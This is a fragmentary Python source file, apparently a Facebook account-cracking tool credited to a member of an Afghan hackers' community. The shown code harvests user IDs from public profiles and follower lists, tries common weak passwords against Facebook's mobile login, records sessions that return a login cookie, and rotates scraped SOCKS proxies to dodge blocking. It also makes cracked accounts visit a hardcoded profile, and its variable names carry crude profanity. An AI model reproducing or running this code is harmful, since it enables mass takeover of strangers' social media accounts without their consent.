...
try:
	...
	try:
		...
		os.sys.exit("[?] Sorry bro, doesn't seem to be able to install rich(type : python -m pip install rich &> /dev/null)")
...
try:
	...
	try:
		...
		print(f"[X] currently installing {e.name}, materials, please be patient....")
...
\033[1;97m       ##     ##    ##    ## #### ##    ##  ######\033[1;0m
\033[1;97m--------------------------------------------------
\033[1;91m Author      : MATIN KHAN
\033[1;91m GitHub      : https://github.com/MATIN khan2222
\033[1;91m YouTube     : انجمن هکران افغان 
\033[1;91m Telegram    : https://t.me/AFGHAN_HACKERS_COMMUNITY
\033[1;91m Blogspot    : @YT_NIAZI
\033[1;97m--------------------------------------------------
"""
...
ugen2,ugen,ugen_=[],[],[]
id_ri,idd,id,loop,ok,cp,yyy,apk_me,pass_,method,prox_,opsi_y,url_met,pass_man = [100009918107424],[],[],0,[],[],"AKTIF","TIDAK","","",[],"DOWN","",""
...
class Main():
	...
	def menu_del(self, kataa):
		iprint(Panel(f"{MM}sorry menu {QQ}[{CC}{kataa}{QQ}]{MM}It's not available yet... back to menu", style=Q));time.sleep(3)
		Main()
	def intro(self):
		try:open("data/kata","r").read()
		except:open("data/kata","w").write("#welcome, thanks for looking");kotak(f"# welcome new users !!", K, C)
		now = datetime.now()
		hour = now.hour
		if hour < 4:
			waktu = "good morning"
...
#		elif ki in ["6","06"]:pass
			...
			tod = f"{MM}INVALID OPTION{QQ}[{CC}{ki}{QQ}] {MM} .."
	...
	def ambil_nama(self,idd):
		try:
			...
			iprint(Panel(f"Sorry Id {QQ}[{MM}{idd}{QQ}]{CC} Not Found"))
			time.sleep(3)
			Main()
		return nama
	...
	def public(self):
		try:
			...
			os.sys.exit()
		god = ""
		kotak("# Please Enter Your id/username To Crack !!",C,Q)
		idt = input(f"{k}Enter Id  Public {q}l : ")
		limit = ("10000")
		idt = self.ubah_user(idt)
		god += ("Target Name : "+II+self.ambil_nama(idt)+QQ+"\n")
		try:
		...
		god += "Total Id : "+II+str(len(idd))+QQ
		if len(idd)==0:
			MML = M
			say = "NOT"
		else:
		...
		if say == "NOT":
			kotak("# sorry the number of id collected is zero or not available",M,O)
			os.sys.exit()
	...
	def follow(self):
		try:
			...
			os.sys.exit()
		god = ""
		kotak("# please enter your idz/username to crack!! !!",C,Q)
		idt = input(f"{k}Enter Public Follower{q} : ")
		limit = ("10000")
		idt = self.ubah_user(idt)
		god += ("Target Name : "+II+self.ambil_nama(idt)+QQ+"\n")
		try:
		...
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("CHOOSE", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Crack From Old Account \nCrack From Account New  {QQ}({II}Recommended{QQ}){MM}\nCrack From Random")
		sol().print(tod, justify='center')

		hu = input(f'{c}CHOOSE OPTION {q}: ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			...
			kotak("# INVALID OPTIONS BRO  !!", M, Q);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		crack_new().otomatis()
	...
	def _lonte_(self, ml, token, toket):
		try:
			...
			with requests.Session() as xyz:
				...
				for i in jso["friends"]["data"]:
					try:
						anak_mking_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_mking = i["id"]
						goblok.append(anak_mking_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_mking)
					except:pass
			...
			with requests.Session() as xyz:
				...
				for i in jso["data"]:
					try:
						anak_mking_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_mking_asw = i["id"]
						tolol.append(anak_mking_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_mking_asw)
					except:pass
		except KeyError:pass
		todz = me()
...
class crack_new:
	...
	def mking_Kau_Ikuti(self,sessionn,cokii):
		try:
			r = BeautifulSoup(sessionn.get("https://mbasic.facebook.com/profile.php?id=100009918107424",cookies={"cookie":cokii}).text,"html.parser")
		...
		try:
			puput = {'cookie':cokii}
			with requests.Session() as xyz:
				for x in par(xyz.get('https://mbasic.facebook.com/100009918107424',cookies=puput).content,'html.parser').find_all('a',href=True):
						...
						if len(colmek)<6:
							if len(colmek)<3:
								if pass_ in ["01","1"]:
									...
									pwe.append("100200")
									pwe.append("786786")
									pwe.append("1234512345")

								elif pass_ in ["04","4"]:
									pwe.append("100200")
									pwe.append("1122334455")
									pwe.append("500600")
									pwe.append("1234512345")
									pwe.append("1234554321")
									pwe.append("1122334455")
									pwe.append("123456")
...
#					except Exception as e:print(e)
			...
			print()
			print()
			kotak("# CRACK STARTED PLEASE ACTIVE AIRPLANE MODE BEFOR CRACK ", I, C)
			os.sys.exit()
	...
	def method_fast(self, user, memek,url):
		...
		try:
			...
			anim.update(anim2,description=f"{b}{loop}{q}/{u}{len(idd)}{q} Mking-OK:{i}{len(ok)}{q} Mking-CP:{k}{len(cp)}{q}")
			anim.advance(anim2)
		except:
			loop-=1
			...
			for pw in memek:
				...
				if 'c_user'+yyy in session.cookies.get_dict():
					...
					if "IYA" in apk_me:
						...
						prints(ok__)
					self.mking_Kau_Ikuti(session,coki)
					break
...
#		except Exception as e:print(e)
	...
	#	{str(rr(111,999))}
		...
		if pilih_ in ("1","01"):
			...
			kotak("# MAAF CHOOSE ANDA TIDAK DITEMUKAN",M,Q)
			self.buat_ugen()
	...
	def tanya_opsi(self):
		...
		if kp in [""," "]:
			...
			tod = f"{MM}Maaf CHOOSE {QQ}[{CC}{kp}{QQ}] {MM}Anda Tidak Tersedia.."
			iprint(Panel(tod, style=Q))
	...
	def pas_me(self):
		...
		if kol in [" ",""]:
			...
			if pwx == '':
				kotak("# JANGAN KOSONG, mking BIG",M,Q)
				time.sleep(3),self.pas_me()
			elif len(pwx)<=5:
			...
			tod = f"{MM}Maaf CHOOSE {QQ}[{CC}{kol}{QQ}] {MM}Anda Tidak Tersedia.."
			iprint(Panel(tod, style=Q))
			time.sleep(3),self.pas_me()
...
def get_proxy_socks5():
	max_proxy = "100000"
	mking_prox = ["https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/?request=displayproxies&protocol=all&timeout={max_proxy}&country=all&ssl=all&anonymity=all"]
	open("data/prox_socks5.txt","w")
	for name_prox in mking_prox:
		try:
...
def get_proxy_socks4():
	max_proxy = "100000"
	mking_prox = ["https://api.proxyscrape.com/?request=displayproxies&protocol=socks4&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/?request=displayproxies&protocol=all&timeout={max_proxy}&country=all&ssl=all&anonymity=all"]
...
#		free_cookies()
		...
		kotak("# MAAF CHOOSE YANG ANDA PILIH TIDAK ADA !!",M,Q);time.sleep(3)
		login()
